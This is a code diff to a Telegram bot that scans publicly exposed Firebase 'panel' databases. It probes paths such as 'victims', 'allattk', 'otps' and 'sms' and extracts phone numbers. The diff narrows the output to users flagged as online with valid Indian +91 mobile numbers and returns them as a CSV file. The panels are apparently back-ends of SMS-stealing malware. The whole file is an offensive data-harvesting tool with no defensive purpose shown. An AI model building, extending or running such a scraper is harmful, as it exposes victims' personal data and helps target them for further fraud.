@@ -32,21 +32,17 @@ VERCEL_URL = (
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger("panel-bot")
 
-# Paths to probe (full fetch, not shallow)
 PANEL_PATHS = [
     "", "users", "numbers", "phone", "phones",
     "sms", "otps", "allattk", "data", "victims",
     "clients", "accounts", "All_Users", "All_User",
+    "online", "online_users", "onlineUsers", "active", "activeUsers",
 ]
 
-# Field names that contain a phone number
 PHONE_FIELDS = {
     "number", "phone", "phonenumber", "mobile", "mobilenumber",
     "phone_number", "mobile_number", "contact", "msisdn", "tel",
 }
-
-# Regex to validate a phone number
-PHONE_RE = re.compile(r"^\+?\d{7,15}$")
 
 tg_app = Application.builder().token(BOT_TOKEN).build()
 
@@ -65,33 +61,108 @@ app = FastAPI(lifespan=lifespan)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Phone extraction engine
+# Online detection
 # ─────────────────────────────────────────────────────────────────────────────
-def extract_phones(node, found):
-    """Recursively walk JSON, collect values of phone-like fields."""
+def is_online(node) -> bool:
+    """Return True if this node explicitly marks itself online."""
+    if not isinstance(node, dict):
+        return False
+    for k, v in node.items():
+        kl = str(k).lower().replace("_", "").replace(" ", "")
+
+        # boolean-style online fields
+        if kl in ("online", "isonline", "isactive", "active"):
+            if v is True or v == 1:
+                return True
+            if isinstance(v, str) and v.lower() in ("true", "1", "yes", "online"):
+                return True
+
+        # string-style status fields
+        if kl in ("status", "connection", "connectionstatus", "state", "presence"):
+            if isinstance(v, str) and v.lower() in ("online", "connected"):
+                return True
+
+    return False
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Indian phone normalization
+# ─────────────────────────────────────────────────────────────────────────────
+def normalize_indian(raw: str) -> str | None:
+    """
+    Accept only valid Indian mobile numbers. Return +91XXXXXXXXXX or None.
+    Valid: +91 + 10 digits starting 6-9, or bare 10 digits, or 12-digit 91-prefixed.
+    """
+    raw = str(raw).strip()
+    if not raw:
+        return None
+
+    digits = re.sub(r"\D", "", raw)
+    if not digits:
+        return None
+
+    # Explicit + prefix: MUST be +91 followed by exactly 10 valid digits
+    if raw.startswith("+"):
+        if not raw.startswith("+91"):
+            return None
+        if len(digits) == 12:
+            local = digits[2:]
+            if len(local) == 10 and local[0] in "6789":
+                return "+91" + local
+        return None
+
+    # Bare 10-digit Indian mobile
+    if len(digits) == 10 and digits[0] in "6789":
+        return "+91" + digits
+
+    # 12 digits starting with 91
+    if len(digits) == 12 and digits.startswith("91"):
+        local = digits[2:]
+        if local[0] in "6789":
+            return "+91" + local
+
+    # 11 digits starting with 0 (trunk prefix)
+    if len(digits) == 11 and digits.startswith("0"):
+        local = digits[1:]
+        if local[0] in "6789":
+            return "+91" + local
+
+    return None
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Extraction — online + Indian only
+# ─────────────────────────────────────────────────────────────────────────────
+def extract_online_indian(node, found, online_ctx=False):
+    """
+    Walk JSON tree. Track online status via parent inheritance.
+    Only extract phone numbers when the node context is online.
+    """
     if isinstance(node, dict):
+        node_online = online_ctx or is_online(node)
+
         for k, v in node.items():
-            if isinstance(k, str) and k.lower().replace("_", "").replace(" ", "") in PHONE_FIELDS:
-                if isinstance(v, (str, int)):
-                    val = str(v).strip()
-                    if PHONE_RE.match(val):
-                        found.add(val)
-            else:
-                extract_phones(v, found)
+            if isinstance(v, (str, int)) and not isinstance(v, bool):
+                kl = str(k).lower().replace("_", "").replace(" ", "")
+                if kl in PHONE_FIELDS and node_online:
+                    normalized = normalize_indian(str(v))
+                    if normalized:
+                        found.add(normalized)
+            elif isinstance(v, (dict, list)):
+                extract_online_indian(v, found, node_online)
+
     elif isinstance(node, list):
         for item in node:
-            extract_phones(item, found)
-    elif isinstance(node, str):
-        # Sometimes bare strings are phone numbers
-        if PHONE_RE.match(node.strip()):
-            found.add(node.strip())
+            extract_online_indian(item, found, online_ctx)
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# Firebase fetch
+# ─────────────────────────────────────────────────────────────────────────────
 async def fetch_path(session, base, path):
-    """Fetch full JSON at path, return parsed data."""
     url = f"{base}/{path}.json" if path else f"{base}/.json"
     try:
-        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
+        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as r:
             if r.status != 200:
                 return None
             return await r.json(content_type=None)
@@ -109,7 +180,7 @@ async def scan_panel(session, url):
     phones = set()
     for data in results:
         if data:
-            extract_phones(data, phones)
+            extract_online_indian(data, phones)
 
     return url, sorted(phones)
 
@@ -149,11 +220,11 @@ async def send_rich(context, chat_id, html, keyboard=None):
 # ─────────────────────────────────────────────────────────────────────────────
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     html = (
-        "<b>PANEL PHONE EXTRACTOR</b>\n"
-        "<i>extracts phone numbers from Firebase panels</i>\n\n"
+        "<b>ONLINE INDIAN NUMBER EXTRACTOR</b>\n"
+        "<i>online users only · Indian numbers only</i>\n\n"
         "Paste one or more Firebase panel URLs.\n"
-        "One per line. I walk the whole tree and pull\n"
-        "every <code>Number</code> / <code>phone</code> field.\n\n"
+        "One per line. I pull only <b>online</b> users\n"
+        "with valid <b>+91</b> phone numbers.\n\n"
         "<b>Example:</b>\n"
         "<code>https://panel-wala-v27-default-rtdb.firebaseio.com</code>"
     )
@@ -185,16 +256,17 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     ack = await context.bot.send_message(
-        chat_id, f"Extracting phones from <b>{len(urls)}</b> panel(s)…",
+        chat_id,
+        f"Scanning <b>{len(urls)}</b> panel(s) for online Indian numbers…",
         parse_mode=ParseMode.HTML,
     )
 
     result = await scan_all(urls)
 
     lines = [
-        "<b>EXTRACTION COMPLETE</b>",
+        "<b>SCAN COMPLETE</b>",
         f"<b>Panels:</b> {len(urls)}",
-        f"<b>Total phone numbers:</b> <b>{result['count']}</b>",
+        f"<b>Online Indian numbers:</b> <b>{result['count']}</b>",
         "",
     ]
     for u, phones in result["per_url"].items():
@@ -222,14 +294,14 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for n in result["unique"]:
             w.writerow([n, scanned_at])
 
-        filename = f"phone_numbers_{ts}.csv"
+        filename = f"online_indian_{ts}.csv"
         doc = InputFile(
             io.BytesIO(buf.getvalue().encode("utf-8")),
             filename=filename, mime_type="text/csv",
         )
         await context.bot.send_document(
             chat_id=chat_id, document=doc,
-            caption=f"<b>{result['count']}</b> phone numbers · {filename}",
+            caption=f"<b>{result['count']}</b> online Indian numbers · {filename}",
             parse_mode=ParseMode.HTML,
         )
 
@@ -245,7 +317,7 @@ tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))
 # ─────────────────────────────────────────────────────────────────────────────
 @app.get("/")
 async def health():
-    return {"status": "ok", "bot": "phone-extractor", "alias": VERCEL_URL}
+    return {"status": "ok", "bot": "online-indian-extractor", "alias": VERCEL_URL}
 
 
 @app.get("/setwebhook")
